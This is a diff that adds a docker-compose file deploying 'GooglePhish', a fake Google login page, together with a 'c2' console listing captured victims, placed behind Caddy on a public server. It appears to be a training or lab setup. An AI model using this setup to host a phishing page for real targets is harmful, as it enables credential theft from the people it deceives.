@@ -1,0 +1,108 @@
+services:
+
+  # The page people see.
+  #
+  # BIND decides who can reach it:
+  #   127.0.0.1  (default) - this machine only. Right for the droplet,
+  #                          where Caddy on 443 is the only way in and the
+  #                          link must not carry a port number.
+  #   0.0.0.0              - everyone on your network. Right for trying it
+  #                          with somebody else's laptop in the room.
+  #
+  # Set it in .env, along with PUBLIC_HOST, which must match the address
+  # people actually type or Django answers 400.
+  phish:
+    build: .
+    image: googlephish:local
+    container_name: week1-phish
+    command: ["sh", "-c", "poetry run python manage.py migrate && poetry run gunicorn GooglePhish.wsgi:application -b 0.0.0.0:8000 --workers 3 --threads 2 --timeout 60"]
+    # No host port: Caddy is the only way in and reaches this container
+    # over the private compose network as phish:8000.
+    expose:
+      - "8000"
+    volumes:
+      - ./data:/GooglePhish/data
+    environment:
+      ROLE: "phish"
+      DJANGO_SECRET_KEY: "${DJANGO_SECRET_KEY:?run the line in .env.example to make one}"
+      C2_PASSWORD: "${C2_PASSWORD:?copy .env.example to .env and set it}"
+      ALLOWED_HOSTS: "localhost,127.0.0.1,${PUBLIC_HOST:-localhost}"
+      # Both schemes listed so neither the http nor the https profile 403s.
+      CSRF_TRUSTED_ORIGINS: "http://localhost,http://127.0.0.1,http://${PUBLIC_HOST:-localhost},https://localhost,https://127.0.0.1,https://${PUBLIC_HOST:-localhost}"
+      DEBUG: "False"
+      HTTPS: "${HTTPS:-0}"
+      BRAND: "${BRAND:-evilucimx}"
+    restart: unless-stopped
+
+  # Your console. Always loopback, whatever BIND says - your friend in the
+  # room is meant to see the page, never the list of who fell for it.
+  # On the droplet, reach it with:
+  #     ssh -L 8001:127.0.0.1:8001 root@your-droplet
+  c2:
+    image: googlephish:local
+    container_name: week1-c2
+    depends_on:
+      - phish
+    ports:
+      - "127.0.0.1:8001:8000"
+    volumes:
+      - ./data:/GooglePhish/data
+    environment:
+      ROLE: "c2"
+      DJANGO_SECRET_KEY: "${DJANGO_SECRET_KEY:?run the line in .env.example to make one}"
+      C2_PASSWORD: "${C2_PASSWORD:?copy .env.example to .env and set it}"
+      ALLOWED_HOSTS: "localhost,127.0.0.1"
+      CSRF_TRUSTED_ORIGINS: "http://localhost:8001,http://127.0.0.1:8001"
+      BRAND: "${BRAND:-evilucimx}"
+      DEBUG: "False"
+    restart: unless-stopped
+
+  # --- The front door. One of these two runs, chosen by COMPOSE_PROFILES
+  # in .env. Both put Caddy in front of the phish container so the URL has
+  # no port in either mode; phish itself never publishes a host port.
+  #
+  #   COMPOSE_PROFILES=https   self-signed TLS on 443 (browser warns, click through)
+  #   COMPOSE_PROFILES=http    plain HTTP on 80, no cert, no warning
+  #
+  # Pick exactly one - both share the name week1-caddy and port 80, so
+  # listing both at once will not start.
+
+  # HTTPS: terminates TLS on 443 with a self-signed cert from Caddy's own
+  # local CA (see Caddyfile.local). Plain http on 80 redirects up to it.
+  caddy-https:
+    image: caddy:2
+    container_name: week1-caddy
+    profiles: ["https"]
+    depends_on:
+      - phish
+    ports:
+      - "${BIND:-127.0.0.1}:80:80"
+      - "${BIND:-127.0.0.1}:443:443"
+    volumes:
+      - ./Caddyfile.local:/etc/caddy/Caddyfile:ro
+      - caddy_data:/data
+      - caddy_config:/config
+    environment:
+      PUBLIC_HOST: "${PUBLIC_HOST:-localhost}"
+    restart: unless-stopped
+
+  # HTTP: serves the page over plain http on 80. No certificate, so no
+  # browser warning - the trade-off is no padlock.
+  caddy-http:
+    image: caddy:2
+    container_name: week1-caddy
+    profiles: ["http"]
+    depends_on:
+      - phish
+    ports:
+      - "${BIND:-127.0.0.1}:80:80"
+    volumes:
+      - ./Caddyfile.http:/etc/caddy/Caddyfile:ro
+      - caddy_config:/config
+    environment:
+      PUBLIC_HOST: "${PUBLIC_HOST:-localhost}"
+    restart: unless-stopped
+
+volumes:
+  caddy_data:
+  caddy_config:
